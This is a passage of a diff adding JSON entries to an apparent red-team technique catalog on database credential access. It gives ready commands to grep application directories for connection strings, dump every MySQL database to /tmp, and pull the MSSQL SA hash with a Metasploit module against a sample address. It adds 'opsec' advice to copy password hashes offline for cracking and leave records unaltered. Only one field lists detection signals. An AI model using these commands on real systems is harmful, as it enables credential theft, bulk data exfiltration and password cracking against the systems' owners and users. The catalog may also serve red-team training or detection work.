+      {
+        "description": "Hunt for database connection strings in application source code",
+        "command": "grep -riE '(mysql|postgres|mongodb|mssql|redis|oracle)://[^\\s\"]+' /var/www /opt /app 2>/dev/null\ngrep -riE 'connectionString\\s*=\\s*[\"' /var/www /opt 2>/dev/null",
+        "method": "Bash/grep"
+      },
+      {
+        "description": "Dump entire MySQL database for offline analysis",
+        "command": "mysqldump -u root -p --all-databases > /tmp/all_dbs.sql",
+        "method": "mysqldump"
+      },
+      {
+        "description": "Extract MSSQL SA hash with Metasploit",
+        "command": "use auxiliary/scanner/mssql/mssql_hashdump\nset RHOSTS 192.168.1.10\nset USERNAME sa\nset PASSWORD sa\nrun",
+        "method": "Metasploit"
+      }
+    ],
+    "prerequisites": "Database access; ability to read credential tables or hashes",
+    "opsec": "Extract password hashes from system tables (MySQL user, pg_shadow, syslogins). Copy offline for cracking. Avoid altering records.",
+    "detection_ref": "Access to credential tables audited; SQL audit for system table queries; file monitoring for database dump files"
+  }
+}
